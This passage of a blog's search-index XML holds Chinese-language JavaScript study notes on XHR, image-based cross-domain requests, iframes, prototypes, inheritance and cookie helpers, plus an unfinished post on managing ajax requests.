class="string">&quot;GET&quot;</span>, <span class="string">&quot;response.php?func=&quot;</span> + printf(<span class="string">&quot;Instead of origin HTML&quot;</span>), <span class="literal">true</span>);</span><br><span class="line">        xmlhttp.send();</span><br><span class="line">    &#125;</span><br><span class="line">    window.onclick = loadXMLDoc;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">createXHR</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> aVersions = [<span class="string">&quot;MSXML2.XMLHttp.6.0&quot;</span>, <span class="string">&quot;MSXML2.XMLHttp.3.0&quot;</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; aVersions; i++) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                <span class="keyword">var</span> oXHR = <span class="keyword">new</span> ActiveXObject(aVersions[i]);</span><br><span class="line">                <span class="keyword">return</span> oXHR;</span><br><span class="line">            &#125;catch(oError)&#123;</span><br><span class="line">                不执行任何操作</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        throw <span class="keyword">new</span> Error(<span class="string">&quot;MSXML is not installed.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">在给src特性复制的同时会下载一个图像，这意味着甚至无需将该图像添加到页面中</span><br><span class="line">基于图像实现跨域通信</span><br><span class="line">*</span><br><span class="line">*       启动并连续向服务器发送骑牛的最佳方式是什么？在有些情况下，最好是从服务器与载入一些信息，</span><br><span class="line">* 以便能够快读相应用户的操；而在另外一些情况下，你可能想在不同的时间间隔内，向服务器发送</span><br><span class="line">* 数据或者从服务器接收数据。</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> oImg = document.createElement(<span class="string">&quot;img&quot;</span>);</span><br><span class="line">    oImg.onload = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        alert(<span class="string">&quot;Image is ready&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    oImg.src = <span class="string">&quot;./images/001.gif&quot;</span>;</span><br><span class="line">    document.body.appendChild(oImg);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">createIFrame</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> oframe = document.createElement(<span class="string">&quot;iframe&quot;</span>);</span><br><span class="line">        oframe.name = <span class="string">&quot;myIFrame&quot;</span>;</span><br><span class="line">        oframe.id = <span class="string">&quot;myIFrame&quot;</span>;</span><br><span class="line">        oframe.style.cssText = <span class="string">&quot;height:500px; width:400px; border:none&quot;</span>;</span><br><span class="line">        oframe.src = <span class="string">&quot;http:jqueryui.com/demos/droppable/accepted-elements.html&quot;</span>;</span><br><span class="line">        document.body.appendChild(oframe);</span><br><span class="line">    &#125;</span><br><span class="line">    createIFrame();</span><br><span class="line"></span><br><span class="line">面向对象的Javascript</span><br><span class="line"><span class="number">1.</span>公共成员</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Customer</span>(<span class="params"></span>) &#123;</span><br><span class="line">    this.firstName = <span class="string">&quot;John&quot;</span>;</span><br><span class="line">    this.lastName = <span class="string">&quot;Smith&quot;</span>;</span><br><span class="line">    this.getFullName = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> this.firstName +  <span class="string">&quot; &quot;</span> + this.lastName;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> john = <span class="keyword">new</span> Customer();</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>私有变量</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Customer</span>(<span class="params">firstName, lastName</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> _firstName = firstName;</span><br><span class="line">    <span class="keyword">var</span> _lastName = lastName;</span><br><span class="line">    this.getFullName = <span class="keyword">function</span> (<span class="params"></span>) &#123;闭包</span><br><span class="line">        <span class="keyword">return</span> _firstName +  <span class="string">&quot; &quot;</span> + _lastName;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">prototype属性</span><br><span class="line">扩展类的定义</span><br><span class="line">如果在prototype属性所引用的对象里没有找到，它会到这个引用对象的prototype属性里查找，如此递归查询。</span><br><span class="line">Customer.prototype.getFullName = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> this.firstName + <span class="string">&quot; &quot;</span> + this.lastName;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">面向对象编程和继承</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Partner</span>(<span class="params"></span>) &#123;</span><br><span class="line">    this.partnerId = <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">Partner.prototype = <span class="keyword">new</span> Customer();</span><br><span class="line"></span><br><span class="line">与上等价</span><br><span class="line">Partner.prototype = &#123;</span><br><span class="line">    <span class="attr">firstName</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="attr">lastName</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">★★★★★★★★Cookie★★★★★★★★</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">setCookie</span>(<span class="params">name,value,days</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (days) &#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="built_in">date</span> = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">        <span class="built_in">date</span>.setTime(<span class="built_in">date</span>.getTime()+(days*<span class="number">24</span>*<span class="number">60</span>*<span class="number">60</span>*<span class="number">1000</span>));</span><br><span class="line">        <span class="keyword">var</span> expires = <span class="string">&quot;; expires=&quot;</span>+<span class="built_in">date</span>.toGMTString();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">var</span> expires = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    document.cookie = name+<span class="string">&quot;=&quot;</span>+value+expires+<span class="string">&quot;; path=/&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getCookie</span>(<span class="params">name</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> nameEQ = name + <span class="string">&quot;=&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> ca = document.cookie.<span class="built_in">split</span>(<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i &lt; ca.<span class="built_in">length</span>;i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> c = ca[i];</span><br><span class="line">        <span class="keyword">while</span> (c.charAt(<span class="number">0</span>)==<span class="string">&#x27; &#x27;</span>) c = c.substring(<span class="number">1</span>,c.<span class="built_in">length</span>);</span><br><span class="line">        <span class="keyword">if</span> (c.<span class="built_in">indexOf</span>(nameEQ) == <span class="number">0</span>) <span class="keyword">return</span> c.substring(nameEQ.<span class="built_in">length</span>,c.<span class="built_in">length</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">deleteCookie</span>(<span class="params">name</span>) &#123;</span><br><span class="line">    setCookie(name,<span class="string">&quot;&quot;</span>,<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 杂物间 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ajax请求管理</title>
      <link href="/blog/2012/09/16/ajax%E8%AF%B7%E6%B1%82%E7%AE%A1%E7%90%86/"/>
      <url>/blog/2012/09/16/ajax%E8%AF%B7%E6%B1%82%E7%AE%A1%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p><strong>本文从ITeye导入</strong></p><p><span><strong>ajax请求管理&mdash;&mdash;</strong>问题提出</span></p><p><span>&nbsp;&nbsp;&nbsp; Ajax应用程序虽然很强大且对用户很友好，但是也存在一些问题。</span></p><p><span>&nbsp;&nbsp;&nbsp; 如果客户端向服务器发送请求过于频繁，服务器将会陷入对来自多个用户的大量请求的处理中。进而，客户端在等待服务器返回大量的响应时就会变得十分迟钝。</span></p><p><span>&nbsp;&nbsp;&nbsp; <a class="quote_title" title="http1.1" href="http://www.w3.org/Protocols/rfc2616/rfc2616-sec5.html#sec5" target="_blank">HTTP1.1规范</a>中规定一个客户端在同一时刻与同一个域名不能有两个以上的链接。虽然有一些方法能够突破这个限制（诸如使用子域名来处理某些请求），但绝大多数浏览器在同一时刻能够发起的链接也是有限的。</span></p><p><span>&nbsp;&nbsp;&nbsp; 当使用XHR时，这个限制将在后台进行处理：你只是根据自己的需求来启动请求，而浏览器在打开连接时将把他们放到队列中逐步发送。当请求比较少或者间隔比较长时，这种工作机制是能够满足需求的；但当在不同时刻，应用程序的各个部分都将发送请求时，这种内建的队列机制就无法提供足够的控制，无法确定请求将在何时发送，哪个请求先发送等。</span></p><p><span>&nbsp;&nbsp;&nbsp; 幸好，实现一个能够处理更复杂通信模式的自定义请求管理器并不难~</span></p><p><span>&nbsp;&nbsp;&nbsp; 待续......</span></p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 杂物间 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
